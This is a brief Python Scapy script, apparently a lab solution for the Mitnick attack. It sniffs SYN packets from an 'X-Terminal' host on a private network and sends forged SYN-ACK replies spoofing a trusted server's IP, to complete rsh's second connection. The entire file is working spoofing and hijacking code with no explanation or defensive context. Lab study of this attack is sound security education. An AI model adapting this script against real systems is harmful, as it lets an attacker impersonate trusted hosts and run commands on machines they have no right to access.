from scapy.all import *

server_ip = "10.0.2.9"
server_port_rsh=9090

x_terminal_ip = "10.0.2.7"
x_terminal_port_rsh = 1023
	
def sniff_spoof(pkt):
	previous_packet_ip = pkt[IP]
	previous_packet_tcp = pkt[TCP]

	if previous_packet_tcp.flags =="S":
		print("Sending SYNACK Packet")
		ip = IP(src = server_ip, dst = x_terminal_ip)
		tcp= TCP(sport = server_port_rsh, dport = x_terminal_port_rsh, flags = "SA", seq = 2019551955, ack = previous_packet_ip.seq + 1)
		send (ip/tcp, verbose=0)

pkt = sniff(filter="tcp and dst host 10.0.2.9 and dst port 9090", prn=sniff_spoof)
